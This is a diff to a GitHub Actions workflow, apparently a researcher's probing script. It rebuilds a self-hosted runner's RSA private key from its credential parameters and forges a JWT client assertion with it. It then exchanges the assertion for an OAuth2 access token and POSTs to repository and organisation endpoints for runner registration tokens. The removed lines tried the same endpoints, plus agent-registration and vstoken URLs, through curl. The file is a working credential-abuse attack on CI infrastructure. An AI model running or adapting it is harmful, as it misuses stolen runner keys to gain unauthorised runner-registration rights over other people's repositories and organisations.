@@ -4,15 +4,15 @@ jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: Generate JWT And Try All Endpoints
+      - name: OAuth2 Token Exchange
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
           pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
           
           python3 -c "
-          import json, time, base64, jwt, urllib.request, urllib.error
-          from cryptography.hazmat.primitives import serialization
+          import json, time, base64, jwt
+          import urllib.request, urllib.parse, urllib.error
           from cryptography.hazmat.backends import default_backend
           from cryptography.hazmat.primitives.asymmetric.rsa import (
               RSAPrivateNumbers, RSAPublicNumbers, rsa_crt_iqmp, rsa_crt_dmp1, rsa_crt_dmq1
@@ -31,117 +31,105 @@ jobs:
               b64 += '=' * (4 - len(b64) % 4)
               return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
           
-          # Fixed key names
+          # Build RSA key
           p = b64_to_int(params['p'])
           q = b64_to_int(params['q'])
           d = b64_to_int(params['d'])
-          n = b64_to_int(params['modulus'])    # Fixed
-          e = b64_to_int(params['exponent'])   # Fixed
+          n = b64_to_int(params['modulus'])
+          e = b64_to_int(params['exponent'])
           dp = b64_to_int(params['dp'])
           dq = b64_to_int(params['dq'])
           iq = b64_to_int(params['inverseQ'])
           
           private_numbers = RSAPrivateNumbers(
               p=p, q=q, d=d,
-              dmp1=dp,
-              dmq1=dq,
-              iqmp=iq,
+              dmp1=dp, dmq1=dq, iqmp=iq,
               public_numbers=RSAPublicNumbers(e=e, n=n)
           )
-          
           private_key = private_numbers.private_key(default_backend())
-          print('RSA Key Built Successfully!')
+          print('RSA Key Built!')
           
           client_id = creds['data']['clientId']
           auth_url = creds['data']['authorizationUrl']
-          server_url = runner['serverUrl']
-          server_url_v2 = runner['serverUrlV2']
-          agent_id = runner['agentId']
           
-          print('Client ID:', client_id)
           print('Auth URL:', auth_url)
-          print('Server URL:', server_url)
-          print('Server URL V2:', server_url_v2)
+          print('Client ID:', client_id)
           
-          # Create JWT
+          # Step 1: Create JWT for client assertion
           now = int(time.time())
           payload = {
               'sub': client_id,
-              'iat': now,
-              'exp': now + 3600,
               'iss': client_id,
-              'aud': 'https://github.com'
+              'aud': auth_url,
+              'iat': now,
+              'exp': now + 600,
+              'jti': str(time.time())
           }
           
-          token = jwt.encode(payload, private_key, algorithm='RS256')
-          print('JWT Generated:', token[:50], '...')
+          client_assertion = jwt.encode(
+              payload,
+              private_key,
+              algorithm='RS256'
+          )
+          print('Client Assertion JWT:', client_assertion[:50], '...')
           
-          headers = {
-              'Authorization': f'Bearer {token}',
-              'Accept': 'application/json',
-              'Content-Type': 'application/json',
-              'Content-Length': '0'
-          }
+          # Step 2: Exchange JWT for access token
+          # Using OAuth2 client_credentials with JWT assertion
+          form_data = urllib.parse.urlencode({
+              'grant_type': 'client_credentials',
+              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
+              'client_assertion': client_assertion,
+              'client_id': client_id
+          }).encode()
           
-          # Try all endpoints
-          endpoints = [
-              # Auth URL from credentials
-              auth_url,
-              # Pipeline server with token in URL
-              server_url + 'actions/runners/registration-token',
-              # V2 broker endpoint
-              server_url_v2 + 'repos/${{ github.repository }}/actions/runners/registration-token',
-              # Standard API
-              'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token',
-              # Org level
-              'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token'
-          ]
-          
-          for endpoint in endpoints:
-              print(f'\n=== TRYING: {endpoint} ===')
-              try:
-                  req = urllib.request.Request(
-                      endpoint,
-                      method='POST',
-                      headers=headers,
-                      data=b''
-                  )
-                  with urllib.request.urlopen(req) as resp:
-                      print('SUCCESS:', resp.read().decode())
-              except urllib.error.HTTPError as e:
-                  print(f'HTTP {e.code}:', e.read().decode())
-              except Exception as ex:
-                  print('Error:', str(ex))
+          print('\n=== TRYING OAuth2 Token Exchange ===')
+          try:
+              req = urllib.request.Request(
+                  auth_url,
+                  method='POST',
+                  data=form_data,
+                  headers={
+                      'Content-Type': 'application/x-www-form-urlencoded',
+                      'Accept': 'application/json'
+                  }
+              )
+              with urllib.request.urlopen(req) as resp:
+                  token_response = json.loads(resp.read().decode())
+                  print('TOKEN EXCHANGE SUCCESS!')
+                  print(json.dumps(token_response, indent=2))
+                  
+                  # Step 3: Use access token to get runner registration token
+                  access_token = token_response.get('access_token', '')
+                  print('\nAccess Token:', access_token[:50], '...')
+                  
+                  # Try registration endpoints with new token
+                  endpoints = [
+                      'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token',
+                      'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token',
+                  ]
+                  
+                  for ep in endpoints:
+                      print(f'\n=== TRYING {ep} ===')
+                      try:
+                          reg_req = urllib.request.Request(
+                              ep,
+                              method='POST',
+                              data=b'',
+                              headers={
+                                  'Authorization': f'Bearer {access_token}',
+                                  'Accept': 'application/vnd.github.v3+json',
+                                  'Content-Length': '0'
+                              }
+                          )
+                          with urllib.request.urlopen(reg_req) as reg_resp:
+                              print('SUCCESS:', reg_resp.read().decode())
+                      except urllib.error.HTTPError as e:
+                          print(f'HTTP {e.code}:', e.read().decode())
+                          
+          except urllib.error.HTTPError as e:
+              error_body = e.read().decode()
+              print(f'HTTP {e.code}:', error_body)
+          except Exception as ex:
+              import traceback
+              traceback.print_exc()
           "
-
-      - name: Try URL Token Directly
-        run: |
-          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
-          
-          # Extract token from serverUrl
-          SERVER_URL=$(cat $RUNNER_BASE/.runner | python3 -c "
-          import sys, json
-          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
-          print(data.get('serverUrl', ''))
-          ")
-          
-          echo "Server URL: $SERVER_URL"
-          
-          # Use URL token directly
-          echo "=== TRY SERVER URL TOKEN ==="
-          curl -s -X POST \
-          -H "Content-Length: 0" \
-          -H "Accept: application/json" \
-          "$SERVER_URL/repos/${{ github.repository }}/actions/runners/registration-token"
-          
-          echo "=== TRY REGISTRATION ENDPOINT ==="
-          curl -s -X POST \
-          -H "Content-Length: 0" \
-          -H "Accept: application/json" \
-          "$SERVER_URL/_apis/distributedtask/pools/1/agentregistrationrequests"
-          
-          echo "=== TRY VSTOKEN WITH CONTENT LENGTH ==="
-          curl -s -X POST \
-          -H "Content-Length: 0" \
-          -H "Accept: application/json" \
-          "https://vstoken.actions.githubusercontent.com/repos/${{ github.repository }}/actions/runners/registration-token"
